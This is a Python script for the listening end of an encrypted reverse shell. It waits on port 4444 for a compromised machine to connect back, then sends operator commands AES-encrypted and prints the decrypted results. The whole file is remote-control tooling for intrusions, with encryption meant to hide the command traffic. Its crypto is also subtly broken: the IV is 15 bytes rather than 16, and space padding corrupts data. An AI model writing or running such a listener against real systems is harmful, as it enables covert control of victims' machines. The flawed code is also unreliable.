import socket
import base64
from Crypto.Cipher import AES
import hashlib

# AES Key setup
KEY = hashlib.sha256(b"your_secret_key").digest()
IV = b"16byteslongiv__"

def encrypt(data):
    """Encrypt data before sending."""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    data = data + b" " * (16 - len(data) % 16)  # Padding
    return base64.b64encode(cipher.encrypt(data))

def decrypt(data):
    """Decrypt received data."""
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.decrypt(base64.b64decode(data)).strip()

def start_listener():
    """Starts a reverse shell listener."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(1)
    print("[*] Listening for connections...")

    conn, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        cmd = input("$ ").encode()
        if cmd == b"exit":
            conn.send(encrypt(cmd))
            break

        conn.send(encrypt(cmd))
        response = decrypt(conn.recv(4096))
        print(response.decode())

    conn.close()

if __name__ == "__main__":
    start_listener()
